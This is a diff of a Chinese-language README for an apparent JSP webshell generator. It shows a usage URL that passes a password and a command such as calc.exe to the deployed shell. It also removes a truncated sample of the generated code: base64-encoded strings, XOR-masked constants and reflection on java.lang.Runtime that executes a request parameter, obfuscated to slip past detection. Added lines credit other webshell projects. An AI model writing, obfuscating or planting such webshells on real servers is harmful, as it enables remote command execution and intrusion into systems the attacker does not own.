@@ -77,36 +77,11 @@
 
 1.jsp?pwd=your_password&cmd=calc.exe
 
-生成JSP大致代码如下：
+## 感谢
 
-```java
- try {
-        String[] bUKHeZoxwrAKYLkjvcMP = new String[] { "NXwwfDJ8M3w3fDl8MTB8MTF8Nnw4fDF8NA==", "eGVs", "a3Vs", "amF2YS5sYW5nLlJ1bnRpbWU=", "b21iWmN2YnF1bQ==", "bWZtaw==", "PHByZT4=", "PC9wcmU+" };
-        String CSLEQilaJEXYTqhIDubS = dec(bUKHeZoxwrAKYLkjvcMP[((627747 ^ 1285107) ^ (217916 ^ 1662188))], ((362867 ^ 1112231) ^ (464295 ^ 1205371)));
-        String[] jhetxjKiUeIqIeKBycOb = CSLEQilaJEXYTqhIDubS.split("\\|");
-        int jEpUBflQcOJKNizndvCp = ((525415 ^ 1384817) ^ (317417 ^ 1700607));
-        String UQIOIelnYKguiPiMnaQT = null;
-        String nawTPQyIRdcwDULZVBSF = null;
-        Class PGyKjvgngwNbFYoJPbaj = null;
-        java.lang.reflect.Method EbTdlrXQiEuMcgyFuGyY = null;
-        java.lang.reflect.Method HGjRkjZSeXejrnHgtgIq = null;
-        Process gVCGkwmXVnpDbwgkpiyP = null;
-        java.io.InputStream DIFNoxuAzWMRCwXZtJWB = null;
-        byte[] RDwBQBJtrIRqaxomirvG = null;
-        while (true) {
-            int OKovVnfpZyAFhVlmyglP = Integer.parseInt(jhetxjKiUeIqIeKBycOb[jEpUBflQcOJKNizndvCp++]);
-            switch(OKovVnfpZyAFhVlmyglP) {
-                case ((303670 ^ 1554191) ^ (15449 ^ 1255776)):
-                    nawTPQyIRdcwDULZVBSF = request.getParameter(dec(bUKHeZoxwrAKYLkjvcMP[((2039625 ^ 1074544) ^ (1424304 ^ 1753483))], ((841358 ^ 1837015) ^ (835561 ^ 1863352))));
-                    break;
-                case ((849435 ^ 1174311) ^ (325714 ^ 1697127)):
-                    HGjRkjZSeXejrnHgtgIq = PGyKjvgngwNbFYoJPbaj.getMethod(dec(bUKHeZoxwrAKYLkjvcMP[((673702 ^ 1287280) ^ (321257 ^ 1901882))], ((534640 ^ 1947587) ^ (300141 ^ 1117142))), String.class);
-                    break;
-                case ((346862 ^ 1984726) ^ (144870 ^ 1652694)):
-                    out.print(dec(bUKHeZoxwrAKYLkjvcMP[((591409 ^ 1247053) ^ (1047216 ^ 1440714))], ((1916117 ^ 1041302) ^ (390214 ^ 1518349))));
-                    break;
-......................................................
-```
+参考天下大木头师傅的Webshell：https://github.com/KpLi0rn/Shell
+
+参考三梦师傅的Webshell：https://github.com/threedr3am/JSP-Webshells
 
 ## 免责申明
 
